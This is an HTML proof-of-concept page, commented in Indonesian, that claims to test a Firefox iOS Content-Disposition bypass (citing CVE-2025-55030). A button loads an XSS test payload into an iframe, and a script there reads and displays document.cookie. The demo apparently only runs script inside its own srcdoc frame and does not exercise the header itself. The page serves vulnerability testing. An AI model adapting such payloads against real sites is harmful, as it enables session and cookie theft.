<!DOCTYPE html>
<html>
<head>
    <title>Firefox iOS - Content-Disposition XSS PoC</title>
</head>
<body>
    <h1>Firefox iOS Content-Disposition Bypass PoC</h1>
    <p>Menguji apakah Firefox iOS mengabaikan Content-Disposition: Attachment header</p>
    
    <h2>Test: HTML dirender inline padahal seharusnya di-download</h2>
    <button onclick="testContentDisposition()" style="padding:15px;font-size:16px;">
        Load Test Payload
    </button>
    
    <!-- Hidden iframe untuk test -->
    <iframe id="testFrame" style="width:100%;height:300px;border:1px solid black;margin-top:15px;"></iframe>
    
    <script>
        function testContentDisposition() {
            var iframe = document.getElementById('testFrame');
            
            // Simulasi: konten yang seharusnya attachment/di-download
            // tapi dirender inline
            var payload = `
                <html>
                <head><title>Malicious Downloaded File</title></head>
                <body style="font-family:sans-serif;">
                    <h1 style="color:red;">⚠️ XSS Test Payload</h1>
                    <p>File ini seharusnya <strong>di-download</strong> (Content-Disposition: attachment)</p>
                    <p>Tapi Firefox iOS menampilkannya <strong>inline</strong></p>
                    
                    <div style="border:2px solid red;padding:20px;margin:20px;background:#ffeeee;">
                        <h2>Cross-Site Scripting (XSS) Test</h2>
                        <p id="xssTest">Menunggu eksekusi...</p>
                        <script>
                            document.getElementById('xssTest').innerHTML = 
                                '<span style="color:red;font-weight:bold;">XSS BERHASIL! ' +
                                'Skrip JavaScript dieksekusi dalam konteks halaman</span>';
                            
                            // Coba baca cookie (akan kosong di iframe, tapi PoC)
                            document.getElementById('xssTest').innerHTML += 
                                '<br>Document.cookie: ' + (document.cookie || '(empty/httponly)');
                        <\/script>
                    </div>
                    
                    <p><strong>Referensi:</strong> CVE-2025-55030 - Content-Disposition headers 
                    incorrectly ignored for some MIME types</p>
                </body>
                </html>
            `;
            
            iframe.srcdoc = payload;
        }
    </script>
</body>
</html>
